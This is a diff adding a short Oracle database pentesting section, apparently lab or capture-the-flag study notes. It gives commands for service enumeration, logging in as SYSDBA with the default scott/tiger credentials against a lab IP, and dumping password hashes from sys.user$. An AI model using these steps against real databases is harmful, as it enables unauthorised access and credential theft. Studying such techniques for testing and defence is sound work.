@@ -112,4 +112,46 @@
 After installation, connect to the database using:
 ```bash
 sqlplus username/password@//hostname:1521/service_name
-``` 
+```
+
+### Post-Connection Enumeration and Privilege Escalation
+
+1. **Initial Connection**
+   - Service name (e.g., XE) can be enumerated using ODAT
+   - Basic connection format:
+   ```bash
+   sqlplus username/password@//hostname:1521/XE
+   ```
+
+2. **Basic Enumeration**
+   - List all tables accessible to the current user:
+   ```sql
+   SELECT table_name FROM all_tables;
+   ```
+   
+   - Check current user's privileges:
+   ```sql
+   SELECT * FROM user_role_privs;
+   ```
+
+3. **Privilege Escalation**
+   - If appropriate privileges are granted, escalate to SYSDBA:
+   ```bash
+   sqlplus username/password@hostname:1521/XE as sysdba
+   ```
+   
+   - Example with common credentials:
+   ```bash
+   sqlplus scott/tiger@10.129.204.235/XE as sysdba
+   ```
+
+4. **Post-Exploitation**
+   - After gaining SYSDBA access, retrieve database user credentials:
+   ```sql
+   SELECT name, password FROM sys.user$;
+   ```
+
+### Notes
+- Always check for SYSDBA privileges as they provide full database access
+- The `sys.user$` table contains hashed passwords for all database users
+- Common service names include: XE, ORCL, PROD, DEV 
